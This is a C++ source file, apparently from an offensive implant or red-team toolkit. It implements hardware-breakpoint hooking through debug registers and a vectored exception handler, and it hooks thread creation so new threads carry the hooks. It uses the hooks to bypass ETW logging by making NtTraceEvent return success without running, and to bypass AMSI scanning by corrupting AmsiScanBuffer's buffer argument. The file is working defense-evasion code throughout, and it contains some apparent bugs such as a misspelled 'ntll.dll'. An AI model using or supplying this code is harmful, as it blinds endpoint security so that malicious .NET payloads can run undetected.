#include <General.hpp>

DESCRIPTOR_HOOK*      Threads = nullptr;
RTL_CRITICAL_SECTION* Crt     = nullptr;
CRITICAL_SECTION*     CritSec = nullptr;

PVOID Handler     = nullptr;
BOOL  Initialized = FALSE;

auto Hwbp::SetDr7(
    _In_ UPTR ActVal,
    _In_ UPTR NewVal,
    _In_ INT  StartPos,
    _In_ INT  BitsCount
) -> UPTR {
    if (StartPos < 0 || BitsCount <= 0 || StartPos + BitsCount > 64) {
        return ActVal;
    }
    
    UPTR Mask = (1ULL << BitsCount) - 1ULL;
    return (ActVal & ~(Mask << StartPos)) | ((NewVal & Mask) << StartPos);
}

auto Hwbp::Install(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ PVOID Callback,
    _In_ ULONG ThreadID
) -> BOOL {
    if ( Drx < 0 || Drx > 3 ) return FALSE;

    PDESCRIPTOR_HOOK NewEntry = Mem::Alloc<PDESCRIPTOR_HOOK>( sizeof(DESCRIPTOR_HOOK) );
    if ( !NewEntry ) return FALSE;

    NewEntry->Drx      = Drx;
    NewEntry->ThreadID = ThreadID;
    NewEntry->Address  = Address;
    NewEntry->Detour   = (decltype(NewEntry->Detour))Callback;
    NewEntry->Next     = nullptr;
    NewEntry->Prev     = nullptr;

    RtlEnterCriticalSection( CritSec );

    if ( ! Threads ) {
        Threads = NewEntry;
    } else {
        PDESCRIPTOR_HOOK Current = Threads;

        while (Current->Next) {
            Current = Current->Next;
        }

        Current->Next  = NewEntry;
        NewEntry->Prev = Current;
    }

    RtlLeaveCriticalSection( CritSec );

    return Hwbp::Insert(Address, Drx, TRUE, ThreadID);
}

auto Hwbp::SetBreak(
    _In_ ULONG ThreadID,
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ BOOL  Init
) -> BOOL {
    if (Drx < 0 || Drx > 3) return FALSE;

    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE   Handle = NtCurrentThread();
    NTSTATUS Status = STATUS_SUCCESS;

    if ( ThreadID != NtCurrentThreadID ) {
        Handle = OpenThread( THREAD_ALL_ACCESS, FALSE, ThreadID );
        Status = NtGetContextThread( Handle, &Ctx );
        if ( Handle == INVALID_HANDLE_VALUE ) return FALSE;
    } else {
        Status = NtGetContextThread( Handle, &Ctx );
    }

    if ( Init ) {
        (&Ctx.Dr0)[Drx] = Address;
        Ctx.Dr7 = Hwbp::SetDr7( Ctx.Dr7, 3, (Drx * 2), 2 ); // active breakpoint
    } else {
        (&Ctx.Dr0)[Drx] = 0;
        Ctx.Dr7 = Hwbp::SetDr7( Ctx.Dr7, 0, (Drx * 2), 2 ); // desactive breakpoint
    }
    
    if ( Handle != NtCurrentThread() ) {
        Status = NtSetContextThread( Handle, &Ctx );
        Status = CloseHandle( Handle );
    } else {
        Status = NtContinue( &Ctx, FALSE );
    }

    return NT_SUCCESS( Status );
}

auto Hwbp::Uninstall(
    _In_ UPTR  Address,
    _In_ ULONG ThreadID
) -> BOOL {
    PDESCRIPTOR_HOOK Current = Threads;
    RtlEnterCriticalSection( CritSec );
    ULONG   Flag  = 0;
    INT8    Drx   = -1;
    BOOL    Found = FALSE;

    while ( Current ) {

        PDESCRIPTOR_HOOK Next = Current->Next; 

        if ( Current->Address == Address && Current->ThreadID == ThreadID ) {
            Found = TRUE;
            Drx   = Current->Drx;

            if ( Current == Threads ) {
                Threads = Current->Next;
            }

            if ( Current->Next ) {
                Current->Next->Prev = Current->Prev;
            }

            if ( Current->Prev ) {
                Current->Prev->Next = Current->Next;
            }

            if ( Current ) {
                Mem::Free( Current );
            }
        }

        Current = Next;
    }

    RtlLeaveCriticalSection( CritSec );
    if ( Found ) {
        Flag = Hwbp::Insert( Address, Drx, FALSE, ThreadID );
    }

    return Flag;
}

auto Hwbp::GetArg(
    _In_ PCONTEXT Ctx,
    _In_ ULONG    Idx
) -> UPTR {
#ifdef _WIN64
    switch ( Idx ) {
        case 1: {
            return Ctx->Rcx;
        }
        case 2: {
            return Ctx->Rdx;
        }
        case 3: {
            return Ctx->R8;
        }
        case 4: {
            return Ctx->R9;
        }
    }

    return DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) );
#else
    return DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) );
#endif
}

auto Hwbp::SetArg(
    _In_ PCONTEXT Ctx,
    _In_ UPTR     Val,
    _In_ ULONG    Idx
) -> VOID {
#ifdef _WIN64
switch ( Idx ) {
    case 1: {
        Ctx->Rcx = Val; return;
    }
    case 2: {
        Ctx->Rdx = Val; return;
    }
    case 3: {
        Ctx->R8 = Val; return;
    }
    case 4: {
        Ctx->R9 = Val; return;
    }
}
    DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) ) = Val;
#else
    DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) ) = Val;
#endif
}

auto Hwbp::Insert(
    _In_ UPTR  Address,
    _In_ INT8  Drx,
    _In_ BOOL  Init,
    _In_ ULONG ThreadID
) -> BOOL {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };

    ULONG RetLength = 0;
    PVOID TmpValue  = NULL;
    LONG  NtStatus  = STATUS_UNSUCCESSFUL;
    BOOL  Flaged    = FALSE;

    NtStatus = NtQuerySystemInformation( SystemProcessInformation, nullptr, 0, &RetLength );
    if ( NtStatus != STATUS_INFO_LENGTH_MISMATCH ) return FALSE;

    SysProcInfo = Mem::Alloc<PSYSTEM_PROCESS_INFORMATION>( RetLength );
    if ( !SysProcInfo ) return FALSE;

    TmpValue = (PVOID)SysProcInfo;    

    NtStatus = NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, RetLength, &RetLength );
    if ( NtStatus != STATUS_SUCCESS ) return FALSE;

    while ( 1 ) {
        if ( HandleToUlong( SysProcInfo->UniqueProcessId ) == HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess ) ) {

            SysThreadInfo = (PSYSTEM_THREAD_INFORMATION)SysProcInfo->Threads;

            for  ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( ThreadID != HW_ALL_THREADS && ThreadID != HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) ) 
                    continue;

                if ( ! Hwbp::SetBreak( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ), Address, Drx, Init ) ) goto _BOF_END;
            }

            break;
        }

        if ( !SysProcInfo->NextEntryOffset ) break;

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

    Flaged = TRUE;
_BOF_END:
    if ( TmpValue ) Mem::Free( TmpValue );

    return Flaged;
}

auto Hwbp::Init( VOID ) -> BOOL {
    if ( Initialized ) return TRUE;
    
    CritSec = Mem::Alloc<PRTL_CRITICAL_SECTION>( sizeof( RTL_CRITICAL_SECTION ) );

    if ( !CritSec->DebugInfo ) {
        RtlInitializeCriticalSection( CritSec );
    }

    Handler = RtlAddVectoredExceptionHandler(
        1, (PVECTORED_EXCEPTION_HANDLER)Hwbp::MainHandler
    );


    RtlInitializeCriticalSection( CritSec );
    Initialized = TRUE;

    return TRUE;
}

auto Hwbp::Clean( VOID ) -> BOOL {
    if ( !Initialized ) return TRUE;

    RtlEnterCriticalSection( CritSec );

    PDESCRIPTOR_HOOK Current = Threads;

    while ( Current ) {
        PDESCRIPTOR_HOOK Next = Current->Next; 
        Hwbp::Uninstall( Current->Address, Current->ThreadID );

        Current = Next; 
    }

    RtlLeaveCriticalSection( CritSec );

    if ( Handler ) RtlRemoveVectoredExceptionHandler( Handler ); 

    RtlDeleteCriticalSection( CritSec );
    Mem::Free( CritSec );

    Initialized = FALSE;

    return TRUE;
}

auto Hwbp::MainHandler( 
    _In_ PEXCEPTION_POINTERS e 
) -> LONG {
    BOOL Solutioned = FALSE;
    PDESCRIPTOR_HOOK Current = Threads;

    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) goto _BOF_END;
    RtlEnterCriticalSection( CritSec );
    while ( Current ) {
        if ( Current->Address == e->ContextRecord->Rip && !Current->Processed ) {
            if ( Current->ThreadID != 0 && Current->ThreadID != NtCurrentThreadID ) {
        
                Current->Processed = TRUE;
            }
    
            if ( ! Hwbp::SetBreak( Current->ThreadID, Current->Address, Current->Drx, FALSE ) ) {
                goto _BOF_END;
            }
    
            VOID ( *Detour )( PCONTEXT ) = Current->Detour;
            Detour( e->ContextRecord );
    
            if ( ! Hwbp::SetBreak( Current->ThreadID, Current->Address, Current->Drx, TRUE ) ) {
                goto _BOF_END;
            }
    
            Current->Processed = TRUE;
        }

        Current->Processed = FALSE;
        Current = Current->Next;
    }

    RtlLeaveCriticalSection( CritSec );
    Solutioned = TRUE;

_BOF_END:
    return ( Solutioned ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH );
}

auto Hwbp::HookCallback(
    _In_ PVOID Parameter,
    _In_ BOOL  TimerWait
) -> VOID {
    PDESCRIPTOR_HOOK Current = Threads;
    INT8   i      = 0;
    HANDLE Handle = (HANDLE)( *(HANDLE*)Parameter );
    RtlEnterCriticalSection( CritSec );
    while ( Current ) {
        if ( Current->Address && Current->Detour && Current->ThreadID == HW_ALL_THREADS ) {
            Hwbp::Install( Current->Address, Current->Drx, (PVOID)Current->Detour, Current->ThreadID ); i++;     
        }

        if ( i == 4 ) break;

        Current = Current->Next;
    }

    RtlLeaveCriticalSection( CritSec );
    ResumeThread( Handle );
}

auto Hwbp::AddNewThreads(
    _In_ INT8 Drx
) -> BOOL {
    return Hwbp::Install( U_PTR( GetProcAddress( GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx") ), Drx, (PVOID)Hwbp::NtCreateThreadExHk, HW_ALL_THREADS );
}

auto Hwbp::RmNewThreads(
    _In_ INT8 Drx
) -> BOOL {
    return Hwbp::Uninstall( U_PTR( NtCreateThreadEx ), HW_ALL_THREADS );
}

auto Hwbp::NtCreateThreadExHk(
    _In_ PCONTEXT Ctx
) -> VOID {
    HANDLE  Timer  = INVALID_HANDLE_VALUE;
    HANDLE* Handle = (HANDLE*)Hwbp::GetArg( Ctx, 0x01 );
    ULONG   Flags  = Hwbp::GetArg( Ctx, 0x07 );
    
    Flags = Flags | THREAD_CREATE_FLAGS_CREATE_SUSPENDED;

    Hwbp::SetArg( Ctx, Flags, 0x07 );

    HookCallbackArg.Parameter = Handle;
    RtlCreateTimer( 
        &Timer, NULL, reinterpret_cast<WAITORTIMERCALLBACKFUNC>( &Hwbp::HookCallback ), (PVOID)&HookCallbackArg, 0, 0, 0
    );

    CONTINUE_EXEC( Ctx );
}

auto Hwbp::DotnetInit( VOID ) -> BOOL {
    if( !Hwbp::Init() ) return FALSE;

    BOOL Success = FALSE;

    if ( Dotnet::Bypass ) {

        if ( Dotnet::Bypass == KH_BYPASS_ETW || Dotnet::Bypass == KH_BYPASS_ALL ) {
            Hwbp::Etw.NtTraceEvent = (UPTR)GetProcAddress( GetModuleHandleA( "ntll.dll" ), "NtTraceEvent" );
            Success = Hwbp::Install( Hwbp::Etw.NtTraceEvent, Dr::x1, (PVOID)Hwbp::EtwDetour, NtCurrentThreadID );
            if ( ! Success ) return Success;
        }


        if ( Dotnet::Bypass == KH_BYPASS_AMSI || Dotnet::Bypass == KH_BYPASS_ALL ) {
            if ( ! Hwbp::Amsi.Handle ) {
                Hwbp::Amsi.Handle = (UPTR)LoadLibraryA( "amsi.dll" );
            }

            if ( Hwbp::Amsi.Handle ) {
                Hwbp::Amsi.AmsiScanBuffer = (UPTR)GetProcAddress( (HMODULE)Hwbp::Amsi.Handle, "AmsiScanBuffer" );
            }

            Success = Hwbp::Install( Hwbp::Amsi.AmsiScanBuffer, Dr::x2, (PVOID)Hwbp::AmsiDetour, NtCurrentThreadID );
            if ( ! Success ) return Success;
        }
    }

    return Success;
}

auto Hwbp::DotnetExit( VOID ) -> BOOL {
    return Hwbp::Clean();
}

auto Hwbp::EtwDetour(
    _In_ PCONTEXT Ctx
) -> VOID {
    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
    Ctx->Rsp += sizeof( PVOID );
    Ctx->Rax  = STATUS_SUCCESS;
}

auto Hwbp::AmsiDetour(
    _In_ PCONTEXT Ctx
) -> VOID {
	Ctx->Rdx = (UPTR)GetProcAddress( GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

    CONTINUE_EXEC( Ctx );
}
